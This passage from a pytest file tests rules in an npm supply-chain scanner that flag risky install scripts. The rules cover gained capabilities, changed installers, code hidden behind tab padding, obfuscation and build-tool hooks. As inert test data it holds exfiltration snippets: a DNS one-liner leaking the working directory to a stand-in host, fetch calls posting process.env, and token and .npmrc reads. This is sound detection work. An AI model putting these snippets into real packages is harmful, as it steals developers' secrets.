"""Stage 3 rules on hand-written profiles built from inert snippets."""

import json

import pytest

from kitsunox.core.models import (
    Finding,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.install import gyp_commands, install_sources
from kitsunox.ecosystems.npm.rules import install_code
from kitsunox.ecosystems.npm.rules.install_code import (
    InstallBuildTool,
    InstallScriptChanged,
    InstallScriptCode,
    InstallScriptObfuscated,
    header_lookup,
)
from kitsunox.rules.capabilities import CapabilityGained, FunctionConstructor
from kitsunox.stages.ast import CapabilityCache, CodeChange, code_change

CACHE = CapabilityCache(None)
SNAP = VersionSnapshot(
    ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.1"),
    publish=PublishInfo(),
    manifest={},
)
PLAIN = {"index.js": b'const fs = require("fs")'}


def pkg(hook: str | None = None, files: dict[str, bytes] | None = None) -> dict[str, bytes]:
    tree = dict(PLAIN) | (files or {})
    if hook is not None:
        tree["package.json"] = json.dumps({"scripts": {"postinstall": hook}}).encode()
    return tree


def change(new: dict[str, bytes], base: dict[str, bytes] | None) -> CodeChange:
    return code_change(SNAP, new, base, CACHE, install_sources, "1.0.0")


def test_gaining_network_with_env_is_medium() -> None:
    new = pkg(files={"lib/x.js": b"fetch(u, {body: JSON.stringify(process.env)})"})
    (finding,) = CapabilityGained().evaluate_code(change(new, PLAIN))
    assert finding.severity is Severity.MEDIUM
    assert "env-all, network" in finding.explanation
    assert {e.path for e in finding.evidence} == {"lib/x.js"}


def test_after_an_empty_placeholder_only_eval_stays_medium() -> None:
    """A first real release after `0.0.0-placeholder` gains everything; `eval` still counts
    (`autotel-*`, `awaitly-*` injected it after an empty first version)."""
    empty = {"index.js": b"module.exports = {}"}
    app = pkg(files={"lib/x.js": b"fetch(u, {body: JSON.stringify(process.env)})"})
    (finding,) = CapabilityGained().evaluate_code(change(app, empty))
    assert finding.severity is Severity.LOW
    payload = pkg(files={"lib/x.js": b"eval(atob(s))"})
    (finding,) = CapabilityGained().evaluate_code(change(payload, empty))
    assert finding.severity is Severity.MEDIUM


def test_gaining_the_environment_without_network_is_low() -> None:
    """v2: apps that start reading `process.env` were the commonest MEDIUM-only report."""
    env = pkg(files={"lib/x.js": b"const v = process.env"})
    (finding,) = CapabilityGained().evaluate_code(change(env, PLAIN))
    assert finding.severity is Severity.LOW
    dynamic = pkg(files={"lib/x.js": b"eval(atob(x))"})
    (finding,) = CapabilityGained().evaluate_code(change(dynamic, PLAIN))
    assert finding.severity is Severity.MEDIUM


def test_gaining_dynamic_code_alone_is_medium_only_through_eval() -> None:
    """v3: `new Function(body)` and `vm` alone were 85 of 90 live reports this rule made alone
    through `dynamic-code`; the malicious ones were injected `eval(` payloads."""
    rule = CapabilityGained()
    for code in (b"new Function(body)", b'import vm from "node:vm"', b"Function(a, b)"):
        (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": code}), PLAIN))
        assert finding.severity is Severity.LOW, code
    for code in (b"eval(payload)", b'globalThis["eval"](payload)', b"new Function(x); eval(y)"):
        (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": code}), PLAIN))
        assert finding.severity is Severity.MEDIUM, code
    # `eval` is shown first, ahead of the `Function` calls before it.
    many = b"new Function(a); new Function(b); new Function(c);\neval(y)"
    (finding,) = rule.evaluate_code(change(pkg(files={"lib/x.js": many}), PLAIN))
    assert finding.severity is Severity.MEDIUM
    assert (finding.evidence[0].snippet or "").startswith("[dynamic-code] eval(y)")
    # With network, `Function` stays MEDIUM; `eval` the base already had is not gained.
    (finding,) = rule.evaluate_code(
        change(pkg(files={"lib/x.js": b"fetch(u); Function(b)"}), PLAIN)
    )
    assert finding.severity is Severity.MEDIUM
    had = pkg(files={"lib/y.js": b"eval(z)"})
    assert rule.evaluate_code(change(pkg(files={"lib/y.js": b"eval(z); Function(b)"}), had)) == ()


def test_gaining_only_network_is_low_and_nothing_for_new_packages() -> None:
    new = pkg(files={"lib/x.js": b"fetch(u)"})
    (finding,) = CapabilityGained().evaluate_code(change(new, PLAIN))
    assert finding.severity is Severity.LOW
    assert CapabilityGained().evaluate_code(change(new, None)) == ()  # new package
    assert CapabilityGained().evaluate_code(change(PLAIN, PLAIN)) == ()


def test_install_script_code_for_new_packages() -> None:
    new = pkg("node setup.js", {"setup.js": b'require("child_process").exec(x)'})
    (finding,) = InstallScriptCode().evaluate_code(change(new, None))
    assert finding.severity is Severity.MEDIUM
    assert "runs setup.js, which uses process." in finding.explanation


def test_install_script_code_counts_only_new_capabilities_on_updates() -> None:
    old = {"setup.js": b'require("https").get(u)'} | pkg("node setup.js")
    same = {"setup.js": b'require("https").get(v)'} | pkg("node setup.js")
    worse = {"setup.js": b'require("https").get(u); eval(x)'} | pkg("node setup.js")
    assert InstallScriptCode().evaluate_code(change(same, old)) == ()
    (finding,) = InstallScriptCode().evaluate_code(change(worse, old))
    assert "dynamic-code (new to the install code)" in finding.explanation
    assert InstallScriptCode().evaluate_code(change(PLAIN, None)) == ()  # no install script


def test_a_changed_install_file_is_shown_as_a_diff() -> None:
    """The hook's command is word for word the same; the file it runs isn't."""
    old = pkg("node setup.js", {"setup.js": b"console.log('hi')\nconst a = 1\n"})
    new = pkg("node setup.js", {"setup.js": b"console.log('hi')\nconst a = 2\nfetch(u)\n"})
    (finding,) = InstallScriptChanged().evaluate_code(change(new, old))
    assert finding.severity is Severity.MEDIUM
    assert finding.explanation == (
        "`npm install` runs code that changed since 1.0.0: setup.js (+2 -1 lines)."
        " The change touches the network."
    )
    (evidence,) = finding.evidence
    assert (evidence.path, evidence.line_start) == ("setup.js", 1)
    assert evidence.snippet is not None
    assert evidence.snippet.splitlines() == [
        "@@ -1,2 +1,3 @@",
        " console.log('hi')",
        "-const a = 1",
        "+const a = 2",
        "+fetch(u)",
    ]
    rule = InstallScriptChanged()
    assert rule.evaluate_code(change(old, old)) == ()  # unchanged
    assert rule.evaluate_code(change(new, None)) == ()  # new package: nothing to compare
    assert rule.evaluate_code(change(PLAIN, PLAIN)) == ()  # no install script


def test_a_newly_run_binary_or_long_install_file() -> None:
    rule = InstallScriptChanged()
    old = pkg("node a.js", {"a.js": b"1"})
    (newly,) = rule.evaluate_code(change(pkg("node b.js", {"b.js": b"2"}), old))
    assert "b.js (newly run)" in newly.explanation
    assert newly.evidence[0].snippet == "@@ -0,0 +1 @@\n+2"
    binary = pkg("node a.js", {"a.js": b"\x00\x01"})
    (found,) = rule.evaluate_code(change(binary, old))
    assert found.evidence[0].snippet == "(binary file changed)"
    long_old = pkg("node a.js", {"a.js": b"x\n" * (install_code.MAX_DIFFED_LINES + 1)})
    (found,) = rule.evaluate_code(change(long_old, old))
    assert "a.js (too long to diff)" in found.explanation
    assert "too long to diff" in (found.evidence[0].snippet or "")


def test_a_long_diff_is_cut() -> None:
    old = pkg("node a.js", {"a.js": b"".join(b"%d\n" % i for i in range(100))})
    new = pkg("node a.js", {"a.js": b"".join(b"%d!\n" % i for i in range(100))})
    (found,) = InstallScriptChanged().evaluate_code(change(new, old))
    lines = (found.evidence[0].snippet or "").splitlines()
    assert len(lines) == install_code.MAX_DIFF_LINES + 1
    assert lines[-1].startswith("... ") and lines[-1].endswith(" more diff lines")


def test_an_install_file_that_changed_only_its_own_version_is_unchanged() -> None:
    old = pkg("node i.js", {"i.js": b"download(`kx@1.0.0`)"})
    new = pkg("node i.js", {"i.js": b"download(`kx@1.0.1`)"})
    assert InstallScriptChanged().evaluate_code(change(new, old)) == ()  # SNAP is 1.0.1
    other = pkg("node i.js", {"i.js": b"download(`evil@1.0.1`)"})
    assert len(InstallScriptChanged().evaluate_code(change(other, old))) == 1


def test_an_install_file_that_changed_only_its_line_endings_is_unchanged() -> None:
    """`@tera-system/pro` 0.2.33: `install.js` went from CRLF to LF, reported +0 -0 lines."""
    old = pkg("node i.js", {"i.js": b"const a = 1;\r\nrun(a);\r\n"})
    new = pkg("node i.js", {"i.js": b"const a = 1;\nrun(a);\n"})
    assert InstallScriptChanged().evaluate_code(change(new, old)) == ()
    edited = pkg("node i.js", {"i.js": b"const a = 2;\nrun(a);\n"})
    (found,) = InstallScriptChanged().evaluate_code(change(edited, old))
    assert "i.js (+1 -1 lines)" in found.explanation


def _pinned(tag: str, sha: str, built: str, commit: str) -> dict[str, bytes]:
    """A generated installer pinning a release tag, its sha256, a build date and a commit."""
    code = (
        f'const TAG = "{tag}";\n'
        f'const SHA = "{sha}";\n'
        f"// built {built} from {commit}\n"
        "download(`https://github.com/o/r/releases/download/${TAG}/r-${TAG}.tgz`, SHA);\n"
    )
    return pkg("node i.js", {"i.js": code.encode()})


def test_an_install_file_changing_only_volatile_strings_is_low() -> None:
    """v4: generated installers (`workerd`, `bun` canaries, `@depot/cli`, `onpod`) pin the
    release they fetch, its digest and a build date; the code is the same."""
    old = _pinned("v2.3.22", "a" * 63 + "1", "2026-11-03", "da867c6")
    new = _pinned("v2.3.38", "b" * 63 + "2", "2026-11-08", "f7607a3")
    (found,) = InstallScriptChanged().evaluate_code(change(new, old))
    assert (found.severity, found.weight) == (Severity.LOW, 1.0)
    assert found.explanation.endswith(install_code.MINOR_NOTE)
    assert '+const TAG = "v2.3.38";' in (found.evidence[0].snippet or "")  # still shown


@pytest.mark.parametrize(
    ("text", "volatile"),
    [
        ("1.2.3", True),
        ("v1.4.4-canary.20261030.1+f7607a3", True),
        ("2026-11-04T17:30:00Z", True),
        ("20261104", True),
        ("da867c6", True),
        ("sha512-" + "A" * 86 + "==", True),
        ("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", True),
        ("10.0.0.1", False),  # an IP address is not a version
        ("1.2", False),
        ("deadbeefcafe", False),  # hex needs a digit and a letter
        ("1234567", False),
        ("evil.example", False),
    ],
)
def test_volatile_strings(text: str, volatile: bool) -> None:
    assert (install_code.VOLATILE.fullmatch(text) is not None) is volatile


def test_anything_but_volatile_strings_keeps_the_medium() -> None:
    old = _pinned("v2.3.22", "a" * 63 + "1", "2026-11-03", "da867c6")
    rule = InstallScriptChanged()
    host = pkg("node i.js", {"i.js": old["i.js"].replace(b"github.com/o/r", b"evil.example/o/r")})
    owner = pkg("node i.js", {"i.js": old["i.js"].replace(b"github.com/o/r", b"github.com/x/r")})
    code = pkg("node i.js", {"i.js": old["i.js"] + b"require('child_process').exec(SHA)\n"})
    ip_old = pkg("node i.js", {"i.js": b'net.connect(443, "10.0.0.1")\n'})
    ip_new = pkg("node i.js", {"i.js": b'net.connect(443, "10.0.0.2")\n'})
    for new, base in ((host, old), (owner, old), (code, old), (ip_new, ip_old)):
        (found,) = rule.evaluate_code(change(new, base))
        assert found.severity is Severity.MEDIUM, new["i.js"]
    newly = pkg("node j.js", {"j.js": b'const v = "1.0.1"; require("https").get(v)'})
    (found,) = rule.evaluate_code(change(newly, old))
    assert found.severity is Severity.MEDIUM  # a file newly run is never "only versions"
    both = pkg(
        "node i.js && node j.js",
        {
            "i.js": _pinned("v2.3.38", "a" * 63 + "1", "2026-11-03", "da867c6")["i.js"],
            "j.js": b'exec("b")',
        },
    )
    base = pkg("node i.js && node j.js", {"i.js": old["i.js"], "j.js": b'exec("a")'})
    (found,) = rule.evaluate_code(change(both, base))
    assert found.severity is Severity.MEDIUM  # one file with a real change: MEDIUM for all


def test_an_install_file_changing_only_its_printed_messages_is_low() -> None:
    """v4: `tunlion`'s error text, `@hsusulist/luc`'s hint, a postinstall banner."""
    old = pkg(
        "node p.js",
        {"p.js": b'try { run() } catch (e) { console.error("install failed - " + e) }\n'},
    )
    new = pkg(
        "node p.js",
        {"p.js": b'try { run() } catch (e) { console.error("install failed: " + e) }\n'},
    )
    (found,) = InstallScriptChanged().evaluate_code(change(new, old))
    assert found.severity is Severity.LOW
    rule = InstallScriptChanged()
    for before, after in (
        (b'exec("npm i a")\n', b'exec("npm i b")\n'),  # a string that is run, not printed
        (b'console.log("a")\n', b'console.log("a"); fetch(u)\n'),  # code added beside it
    ):
        (found,) = rule.evaluate_code(
            change(pkg("node p.js", {"p.js": after}), pkg("node p.js", {"p.js": before}))
        )
        assert found.severity is Severity.MEDIUM, after
    # Not only printed text, but nothing an attack needs either (v5): LOW with the v5 note.
    # Formatting alone is how `hyrox@0.1.6` (unverified) was reported.
    for before, after in (
        (b'console.log(f("a"))\n', b'console.log(f("b"))\n'),
        (b"if (a) { console.log('x') }\n", b"if (a) {\n  console.log('x')\n}\n"),
    ):
        (found,) = rule.evaluate_code(
            change(pkg("node p.js", {"p.js": after}), pkg("node p.js", {"p.js": before}))
        )
        assert found.severity is Severity.LOW, after
        assert found.explanation.endswith(install_code.INERT_NOTE)


def _isc(before: bytes, after: bytes, name: str = "p.js") -> Finding:
    (found,) = InstallScriptChanged().evaluate_code(
        change(pkg(f"node {name}", {name: after}), pkg(f"node {name}", {name: before}))
    )
    return found


def test_a_change_that_touches_nothing_an_attack_needs_is_low() -> None:
    """v5: a refactor, a new option, error handling (round 4: most of the 340 benign reports
    this rule carried alone) is LOW, weight 1, with a note; the diff is still shown."""
    found = _isc(b"const a = opts.x || 1\nrun(a)\n", b"const a = opts.x ?? 2\nif (a) run(a)\n")
    assert (found.severity, found.weight) == (Severity.LOW, 1.0)
    assert found.explanation.endswith(install_code.INERT_NOTE)
    assert "+if (a) run(a)" in (found.evidence[0].snippet or "")
    # Comments and messages are not what the code does: a URL or command in them is not news.
    for after in (
        b"// see https://example.com/docs\nrun(1)\n",
        b'/* curl -fsSL x | sh */ run(1)\nlog.warn("run sudo apt-get install x")\n',
        b'throw new Error("set NPM_TOKEN first")\n',
    ):
        assert _isc(b"run(1)\n", after).severity is Severity.LOW, after


@pytest.mark.parametrize(
    ("after", "kind"),
    [
        (b'exec("node x.js")\n', "processes"),
        (b'require("child_process")\n', "processes"),
        (b"https.get(u)\n", "the network"),
        (b'const HOST = "collector.example.io"\n', "URLs or hosts"),
        (b'const u = "http://10.1.2.3:8080/x"\n', "URLs or hosts"),
        (b'const p = "' + b"QUJD" * 30 + b'"\n', "encoded data"),
        (b'const p = Buffer.from(s, "base64")\n', "encoded data"),
        (b'read(join(home, ".npmrc"))\n', "credentials"),
        (b"const t = process.env.GITHUB_TOKEN\n", "credentials"),
        (b"const h = os.homedir()\n", "the home directory"),
        (b'run("curl -fsSL x")\n', "shell commands"),
        (b'run("sudo touch /x")\n', "shell commands"),
        (b'cmd += "&& npx expo install " + libs\n', "package-manager commands"),
        (b"send(process.env)\n", "the whole environment"),
        (b"eval(code)\n", "dynamic code"),
        (b"require(name)\n", "dynamic code"),
    ],
)
def test_a_change_that_touches_what_an_attack_needs_stays_medium(after: bytes, kind: str) -> None:
    found = _isc(b"run(1)\n", b"run(1)\n" + after)
    assert found.severity is Severity.MEDIUM, after
    assert found.explanation.endswith(f" The change touches {kind}."), found


def test_only_changed_lines_count_and_the_rest_of_the_file_is_not_read() -> None:
    """An installer that downloads its binary changes its option parsing: the `https` lines
    are unchanged, so the change is LOW; a changed download URL is MEDIUM."""
    before = b'const https = require("https")\nconst u = "https://github.com/o/r/x.tgz"\nf(1)\n'
    assert _isc(before, before.replace(b"f(1)", b"f(2)")).severity is Severity.LOW
    moved = before.replace(b"github.com/o/r", b"github.com/evil/r")
    assert _isc(before, moved).severity is Severity.MEDIUM


def test_newly_run_long_and_binary_install_files_under_v5() -> None:
    rule = InstallScriptChanged()
    old = pkg("node a.js", {"a.js": b"1"})
    (inert,) = rule.evaluate_code(change(pkg("node a.js && node b.js", {"b.js": b"f(2)"}), old))
    assert inert.severity is Severity.LOW  # a newly run file that does nothing an attack needs
    risky = pkg("node a.js && node b.js", {"b.js": b'require("https").get(u)'})
    (found,) = rule.evaluate_code(change(risky, old))
    assert found.severity is Severity.MEDIUM
    (binary,) = rule.evaluate_code(change(pkg("node a.js", {"a.js": b"\x00\x01"}), old))
    assert binary.explanation.endswith(" The change touches binary code.")
    # Too long to diff: only matches the previous version didn't have count.
    body = b"f(x)\n" * (install_code.MAX_DIFFED_LINES + 1)
    long_old = pkg("node a.js", {"a.js": b'exec("a")\n' + body})
    rebuilt = pkg("node a.js", {"a.js": b'exec("a")\n' + body + b"g(y)\n"})
    (found,) = rule.evaluate_code(change(rebuilt, long_old))
    assert found.severity is Severity.LOW
    grown = pkg("node a.js", {"a.js": b'exec("a")\n' + body + b'fetch("https://x.example.io")\n'})
    (found,) = rule.evaluate_code(change(grown, long_old))
    assert found.severity is Severity.MEDIUM


_PADDED = b"import { execSync } from 'node:child_process';\n" + b"\t" * 266 + b"var z='-c';f(z)\n"


def test_install_code_hidden_past_the_screen_edge_is_medium() -> None:
    """`hauntview@0.2.9` (malicious): an obfuscated loader behind 266 tabs on one line of
    `scripts/postinstall.mjs`, whose network and eval Stage 3 couldn't see (v3)."""
    clean = pkg("node p.js", {"p.js": b"import { execSync } from 'node:child_process';\nf(1)\n"})
    padded = pkg("node p.js", {"p.js": _PADDED})
    (found,) = InstallScriptCode().evaluate_code(change(padded, clean))
    assert found.severity is Severity.MEDIUM
    assert "hides code past the edge of the screen (line 2" in found.explanation
    assert found.evidence[0].snippet == "var z='-c';f(z)"
    (new,) = InstallScriptCode().evaluate_code(change(padded, None))  # a new package
    assert "hides code" in new.explanation and "uses process" in new.explanation
    assert InstallScriptCode().evaluate_code(change(padded, padded)) == ()  # not new
    # A banner a message prints, and long indentation inside a string, hide nothing.
    banner = b'console.log("' + b" " * 120 + b'hauntview")\nconst s = `' + b" " * 120 + b"x`\n"
    assert install_code.hidden_code("p.js", banner) is None
    assert (
        InstallScriptCode().evaluate_code(change(pkg("node p.js", {"p.js": banner}), clean)) == ()
    )


def test_a_change_that_hides_code_off_screen_stays_medium() -> None:
    found = _isc(b"import { execSync } from 'node:child_process';\nf(1)\n", _PADDED)
    assert found.severity is Severity.MEDIUM
    assert install_code.HIDDEN_KIND in found.explanation


def test_a_long_string_literal_or_hidden_code_counts_in_loaded_files_too() -> None:
    """A file the hook's script loads counts when its change adds a 4 KB+ string literal or
    code pushed off-screen, as well as a risky use (`_adds_risky`, v5)."""
    hook = {"setup.js": b'require("./lib/util")\n'}
    old = pkg("node setup.js", hook | {"lib/util.js": b"f(1)\n"})
    table = b'const T = "' + b"ab" * 2100 + b'"\nf(1)\n'
    (found,) = InstallScriptChanged().evaluate_code(
        change(pkg("node setup.js", hook | {"lib/util.js": table}), old)
    )
    assert found.severity is Severity.MEDIUM
    assert install_code.LONG_KIND in found.explanation
    hidden = pkg("node setup.js", hook | {"lib/util.js": _PADDED})
    (found,) = InstallScriptChanged().evaluate_code(change(hidden, old))
    assert install_code.HIDDEN_KIND in found.explanation
    short = pkg("node setup.js", hook | {"lib/util.js": b'const T = "ab"\nf(1)\n'})
    assert InstallScriptChanged().evaluate_code(change(short, old)) == ()


def test_install_code_writing_agent_configuration_user_wide_keeps_the_medium() -> None:
    """`@aweray/aweshell-cli@0.4.25` (unwanted): its inert diff is in code that names agent
    directories and the home directory, which may write user-wide through code the diff
    doesn't show."""
    base = b'const home = os.homedir()\nconst dirs = [".claude/skills"]\ncopy(dirs, 1)\n'
    found = _isc(base, base.replace(b"copy(dirs, 1)", b"copy(dirs, 2)"))
    assert found.severity is Severity.MEDIUM
    assert install_code.AGENT_USER_WIDE in found.explanation
    project = b'const dir = ".claude/skills"\ncopy(dir, 1)\n'
    assert _isc(project, project.replace(b"1", b"2")).severity is Severity.LOW


def test_a_loaded_install_file_counts_only_when_it_adds_a_risky_use() -> None:
    """`openyida`: the hook's script imports the library, whose ordinary changes aren't news.
    A loaded file's change counts when it adds a network, process, environment or eval use."""
    hook = {"setup.js": b'require("./lib/util")\n'}
    old = pkg("node setup.js", hook | {"lib/util.js": b'const https = require("https")\nf(1)\n'})
    edited = pkg("node setup.js", hook | {"lib/util.js": b'const https = require("https")\nf(2)\n'})
    assert InstallScriptChanged().evaluate_code(change(edited, old)) == ()
    worse = pkg(
        "node setup.js",
        hook | {"lib/util.js": b'const https = require("https")\nrequire("child_process")\n'},
    )
    (found,) = InstallScriptChanged().evaluate_code(change(worse, old))
    assert "lib/util.js (+1 -1 lines)" in found.explanation
    named = pkg("node setup.js", {"setup.js": b'require("./lib/util")\nf(3)\n'})
    named["lib/util.js"] = old["lib/util.js"]
    (found,) = InstallScriptChanged().evaluate_code(change(named, old))
    assert "setup.js (+1 -0 lines)" in found.explanation  # the hook's own file: any change


def test_inline_install_code_is_read() -> None:
    """`dependencykfeg`: the whole payload was a `node -e` one-liner, which named no file."""
    hook = (
        "node -e \"const dns = require('dns'); const d = Buffer.from(process.cwd())"
        ".toString('hex'); dns.lookup(d + '.x.example', () => {});\""
    )
    new = {"package.json": json.dumps({"scripts": {"preinstall": hook}}).encode()}
    (finding,) = InstallScriptCode().evaluate_code(change(new, None))
    assert "package.json#scripts.preinstall.js" in finding.explanation
    assert "network" in finding.explanation


OBFUSCATED = (";".join(f"var _0x{i:04x}=_0x{i + 1:04x}" for i in range(0x1A00, 0x1A20))).encode()


def test_obfuscated_install_code_is_high_and_new_or_changed_on_updates() -> None:
    rule = InstallScriptObfuscated()
    new = pkg("node setup.js", {"setup.js": OBFUSCATED})
    (found,) = rule.evaluate_code(change(new, None))
    assert found.severity is Severity.HIGH
    assert found.explanation.startswith("`npm install` runs obfuscated code: setup.js.")
    assert found.evidence[0].path == "setup.js"
    assert found.evidence[0].snippet is not None and "obfuscator-style" in found.evidence[0].snippet
    assert rule.evaluate_code(change(new, new)) == ()  # the same bytes ran before
    rebuilt = pkg("node setup.js", {"setup.js": OBFUSCATED + b";var _0xffff=1"})
    (changed,) = rule.evaluate_code(change(rebuilt, new))
    assert "(new or changed since the previous version)" in changed.explanation
    # Obfuscated code no hook runs is Stage 2's `static.obfuscated`, not this.
    assert rule.evaluate_code(change(pkg("node index.js", {"lib.js": OBFUSCATED}), None)) == ()
    assert rule.evaluate_code(change(pkg("node setup.js", {"setup.js": b"go()"}), None)) == ()


def test_renamed_obfuscator_output_is_found_by_its_rotation_prologue() -> None:
    """`sino-bc-cli`'s shape: javascript-obfuscator with renamed identifiers, no `_0x`."""
    code = (
        b"#!/usr/bin/env node\n'use strict';const bg=b;(function(c,d){const bf=b,e=c();"
        b"while(!![]){try{const f=parseInt(bf(0xa2a))/0x1+-parseInt(bf(0x1f3))/0x2;"
        b"if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}"
        b"}(a,0x5a1b2));"
    )
    (found,) = InstallScriptObfuscated().evaluate_code(
        change(pkg("node dist/index.js", {"dist/index.js": code}), None)
    )
    assert found.evidence[0].line_start == 2
    assert found.evidence[0].snippet is not None and "rotation" in found.evidence[0].snippet
    plain = pkg("node run.js", {"run.js": b"while (!done) { try { step() } catch {} }"})
    assert InstallScriptObfuscated().evaluate_code(change(plain, None)) == ()


def _hooked(scripts: dict[str, str], files: dict[str, bytes] | None = None) -> CodeChange:
    snapshot = SNAP.model_copy(update={"manifest": {"scripts": scripts}})
    tree = dict(PLAIN) | (files or {})
    return code_change(
        snapshot, tree, None, CACHE, install_sources, None, build_commands=gyp_commands
    )


GYP_ACTION = b"""{'targets': [{'target_name': 'x', 'actions': [{'action_name': 'a',
  'inputs': [], 'outputs': ['o'], 'action': ['node', 'scripts/write-state.js']}]}]}"""
GYP_EXPANSION = b"""{"targets": [{"target_name": "x",
  "include_dirs": ["<!(node scripts/sources.mjs zint)"]}]}"""
GYP_HEADERS = b"""{"targets": [{"target_name": "x",
  "include_dirs": ["<!(node -p \\"require('node-addon-api').include\\")",
                   "<!(node -p \\"require('node-addon-api').include_dir\\")",
                   "<!(node -e \\"require('nan')\\")", "<!(node -e \\"require(\\'nan\\')\\")"],
  "dependencies": ["<!@(node -p \\"require('node-addon-api').gyp\\")"]}]}"""
GYP_PLAIN = b"""{"targets": [{"target_name": "x", "sources": ["src/x.cc"]}]}"""


def test_build_tool_hooks_are_explained_when_binding_gyp_runs_nothing() -> None:
    """F2: `husky`, `npx only-allow pnpm`, `patch-package`, and `node-gyp-build` /
    `node-gyp rebuild` whose binding.gyp runs no command."""
    rule = InstallBuildTool()
    for scripts in (
        {"postinstall": "husky install"},
        {"preinstall": "npx only-allow pnpm"},
        {"postinstall": " patch-package "},
        {"install": "node-gyp-build"},
        {"install": "node-gyp rebuild", "prepare": "node build.js"},  # prepare isn't install
    ):
        (finding,) = rule.evaluate_code(_hooked(scripts, {"binding.gyp": GYP_PLAIN}))
        assert finding.severity is Severity.INFO
        assert finding.weight == 0
        assert finding.explanation.endswith("and `binding.gyp` runs no command.")
    (two,) = rule.evaluate_code(
        _hooked({"preinstall": "npx only-allow pnpm", "install": "node-gyp-build"})
    )
    assert [e.path for e in two.evidence] == [
        "package.json:scripts.preinstall",
        "package.json:scripts.install",
    ]


def test_header_lookups_in_binding_gyp_are_no_command() -> None:
    """v2 (round 3, X6): `node -p "require('node-addon-api').include"` and `require('nan')`
    only print where an installed package's headers are."""
    rule = InstallBuildTool()
    hooked = _hooked({"install": "node-gyp rebuild"}, {"binding.gyp": GYP_HEADERS})
    assert len(hooked.build_commands) == 4  # both `nan` spellings decode to one command
    (finding,) = rule.evaluate_code(hooked)
    assert finding.explanation.endswith(
        "and `binding.gyp` only looks up `node-addon-api` or `nan` headers."
    )
    mixed = GYP_HEADERS.replace(b'"dependencies"', b'"sources": ["<!(node gen.js)"], "x"')
    assert not rule.evaluate_code(_hooked({"install": "node-gyp rebuild"}, {"binding.gyp": mixed}))


@pytest.mark.parametrize(
    "command",
    [
        "node -p \"require('node-addon-api').include\" && curl x",
        "node -p \"require('evil').include\"",
        "node -e \"require('nan'); require('child_process').exec('x')\"",
        "node -p \"console.log(require.resolve('node-addon-api'))\"",
        "node scripts/write-state.js",
    ],
)
def test_other_gyp_commands_are_not_header_lookups(command: str) -> None:
    assert not header_lookup(command)


def test_a_gyp_command_or_any_other_hook_keeps_the_hook_unexplained() -> None:
    """`@atedone/workspace-bootstrap@0.0.1` ran its payload from a gyp action; a command
    expansion other than a header lookup is a command too. A hook beside the build tool, or a
    longer command line, is not a build tool."""
    rule = InstallBuildTool()
    for gyp in (GYP_ACTION, GYP_EXPANSION):
        assert not rule.evaluate_code(
            _hooked({"install": "node-gyp rebuild"}, {"binding.gyp": gyp})
        )
        assert not rule.evaluate_code(_hooked({"postinstall": "husky"}, {"binding.gyp": gyp}))
    for scripts in (
        {},
        {"postinstall": ""},
        {"install": "node-gyp rebuild && node x.js"},
        {"install": "node-gyp-build", "postinstall": "node setup.js"},
        {"preinstall": "npx only-allow npm-evil"},
    ):
        assert not rule.evaluate_code(_hooked(scripts))
    # Without the ecosystem's build commands the stage can't know; npm passes them.
    unknown = code_change(
        SNAP.model_copy(update={"manifest": {"scripts": {"install": "node-gyp rebuild"}}}),
        dict(PLAIN) | {"binding.gyp": GYP_ACTION},
        None,
        CACHE,
        install_sources,
    )
    assert unknown.build_commands == ()


GYP_SCANNER = b"""{"targets": [{"target_name": "tree_sitter_x_binding",
  "include_dirs": ["<!(node -p \\"require('node-addon-api').include\\")", "src"],
  "sources": ["bindings/node/binding.cc", "src/parser.c",
              "<!@(node -p \\"fs.existsSync('src/scanner.c') ? 'src/scanner.c' : ''\\")"]}]}"""


def _manifest_hooked(
    manifest: dict[str, object], files: dict[str, bytes] | None = None
) -> CodeChange:
    snapshot = SNAP.model_copy(update={"manifest": manifest})
    tree = dict(PLAIN) | (files or {})
    return code_change(
        snapshot, tree, None, CACHE, install_sources, None, build_commands=gyp_commands
    )


def test_build_tool_v3_more_tools_and_tree_sitter_scanner() -> None:
    """v3 (round 4, B3): `only-allow npm`, Open Collective's banner, `node-gyp-build ||
    node-gyp rebuild`, `npx @mapbox/node-pre-gyp`, and tree-sitter's scanner test."""
    rule = InstallBuildTool()
    for command in (
        "npx only-allow npm",
        "npx -y only-allow npm",
        "bunx only-allow bun",
        "opencollective-postinstall",
        "node-gyp-build || node-gyp rebuild",
        "npx @mapbox/node-pre-gyp install --fallback-to-build",
    ):
        assert rule.evaluate_code(_hooked({"postinstall": command})), command
    (finding,) = rule.evaluate_code(
        _hooked({"install": "node-gyp-build"}, {"binding.gyp": GYP_SCANNER})
    )
    assert "header" in finding.explanation
    assert header_lookup("node -p \"fs.existsSync('src/scanner.c') ? 'src/scanner.c' : ''\"")
    assert not header_lookup("node -p \"fs.existsSync('src/scanner.c') ? 'x.c' : ''\"")
    assert header_lookup("node -p \"fs.existsSync('src/scanner.c')\"")
    newer = b"""{"targets": [{"target_name": "x", "variables": {
      "has_scanner": "<!(node -p \\"fs.existsSync('src/scanner.c')\\")"}}]}"""
    (command,) = gyp_commands({"binding.gyp": newer})
    assert command == "node -p \"fs.existsSync('src/scanner.c')\""  # v4: the whole command
    assert header_lookup(command)
    assert rule.evaluate_code(_hooked({"install": "node-gyp-build"}, {"binding.gyp": newer}))
    assert not header_lookup("node -p \"fs.existsSync('src/scanner.c'), require('x')\"")
    assert header_lookup("node -p \"require('node-addon-api').targets\"")
    assert not header_lookup("node -p \"fs.existsSync('src/scanner.c') && require('x')\"")


def test_playwright_download_needs_playwright_and_a_tool_the_package_names_is_its_own() -> None:
    rule = InstallBuildTool()
    hooks = {"postinstall": "playwright install chromium"}
    assert rule.evaluate_code(
        _manifest_hooked({"scripts": hooks, "dependencies": {"@playwright/test": "^1.50.0"}})
    )
    assert not rule.evaluate_code(_manifest_hooked({"scripts": hooks}))
    with_deps = {"postinstall": "playwright install --with-deps chromium"}
    assert not rule.evaluate_code(
        _manifest_hooked({"scripts": with_deps, "dependencies": {"playwright": "1"}})
    )
    # The package's own bin named like the tool: `husky` is the package's code.
    assert rule.evaluate_code(_manifest_hooked({"scripts": {"postinstall": "husky"}}))
    assert not rule.evaluate_code(
        _manifest_hooked({"scripts": {"postinstall": "husky"}, "bin": {"husky": "x.js"}})
